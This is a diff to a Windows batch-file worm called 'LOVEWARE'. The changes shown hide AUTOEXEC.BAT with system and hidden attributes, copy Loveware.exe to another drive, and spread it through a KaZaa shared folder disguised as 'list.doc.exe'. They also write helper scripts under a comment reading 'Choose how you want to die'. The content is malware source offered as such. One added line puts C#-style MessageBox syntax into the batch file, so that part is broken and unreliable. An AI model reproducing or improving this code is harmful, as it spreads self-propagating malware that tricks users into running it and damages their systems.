@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.6
+:: LOVEWARE v7.8
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -80,7 +80,7 @@ if %errorLevel% == 0 (
 
 ) else (
 
-    echo Please run as admin!
+    MessageBox.Show("ERROR! You need to run as admin!", Run as admin);
 
 	pause
 
@@ -216,8 +216,6 @@ goto worm
 
 :run2
 
-set z=%random%
-
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
 attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
@@ -273,7 +271,7 @@ xcopy /e /y Loveware.exe H:\
 
 :: Use KaZaa to spread if the user has this ancient stuff
 
-xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\
+xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\list.doc.exe
 
 :: Keyboard reg
 
@@ -334,6 +332,7 @@ echo loop>>speak.vbs
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
 echo title LoveChoice>>LoveChoice.bat
+echo @set z=%random%>>LoveChoice.bat
 
 :: Choose how you want to die
 
